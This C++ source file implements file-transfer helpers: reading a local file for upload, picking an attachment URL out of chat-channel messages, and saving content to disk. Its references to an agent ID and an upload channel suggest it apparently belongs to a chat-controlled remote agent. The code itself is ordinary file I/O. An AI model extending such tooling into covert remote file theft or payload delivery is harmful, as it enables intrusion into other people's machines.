#include "commands/FileUtils.h"
#include <fstream>
#include <iostream>

#ifdef ENABLE_DOWNLOAD
bool FileUtils::PrepareLocalFileUpload(const std::string& filePath, const std::string& agentId,
    std::string& fileContent, std::string& errorMessage) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        errorMessage = "Failed to open file: " + filePath;
        return false;
    }

    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    if (fileSize > MAX_FILE_SIZE) {
        errorMessage = "File size exceeds maximum limit of " + std::to_string(MAX_FILE_SIZE) + " bytes";
        file.close();
        return false;
    }

    fileContent.resize(fileSize);
    file.read(fileContent.data(), fileSize);
    file.close();

    return true;
}
#endif

#ifdef ENABLE_UPLOAD
bool FileUtils::DownloadAndSaveFile(const std::string& channelMessagesJson, const std::string& destination, const std::string& agentId,
    std::string& fileUrl, std::string& messageId, std::string& errorMessage) {
    json messages;
    try {
        messages = json::parse(channelMessagesJson);
    }
    catch (const json::exception& e) {
        errorMessage = "Failed to parse channel messages: " + std::string(e.what());
        return false;
    }

    if (messages.empty()) {
        errorMessage = "Upload channel is empty";
        return false;
    }

    int fileCount = 0;
    for (const auto& msg : messages) {
        if (msg.contains("attachments") && !msg["attachments"].empty()) {
            fileCount++;
        }
    }
    if (fileCount > 10) {
        errorMessage = "Too many files in upload channel (>10)";
        return false;
    }

    for (const auto& msg : messages) {
        if (msg.contains("attachments") && !msg["attachments"].empty()) {
            fileUrl = msg["attachments"][0]["url"].get<std::string>();
            messageId = msg["id"].get<std::string>();
            break;
        }
    }

    if (fileUrl.empty()) {
        errorMessage = "No files found in upload channel";
        return false;
    }

    return true;
}

bool FileUtils::SaveFileContent(const std::string& destination, const std::string& fileContent, std::string& errorMessage) {
    std::ofstream outFile(destination, std::ios::binary);
    if (!outFile.is_open()) {
        errorMessage = "Permission denied or invalid path";
        return false;
    }
    outFile.write(fileContent.data(), fileContent.size());
    outFile.close();
    return true;
}
#endif